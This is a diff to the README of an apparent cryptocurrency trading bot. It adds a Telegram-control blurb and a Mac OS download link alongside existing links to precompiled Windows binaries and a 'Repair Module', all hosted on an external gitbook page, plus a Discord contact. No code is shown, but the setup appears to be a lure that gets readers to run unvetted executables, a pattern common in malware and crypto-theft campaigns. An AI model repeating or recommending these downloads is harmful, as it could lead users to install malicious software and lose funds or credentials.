@@ -23,6 +23,8 @@
 
 ## Download
 
+In order to get full information through your Telegram bot and manage trading through your phone, we have left instructions on how to do it in the app launcher.
+
 1: Download .NET V4.5 [```Download .NET Module```](https://www.microsoft.com/ru-ru/download/details.aspx?id=30653)
 
 2: Install Actual Precompile Release x32 / x64 👇
@@ -35,6 +37,7 @@ Windows MSI Package: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium
 
 Windows Repair Module: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)
 
+Mac OS: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)
 
 Contact me on Discord: ```taaafeth```
 
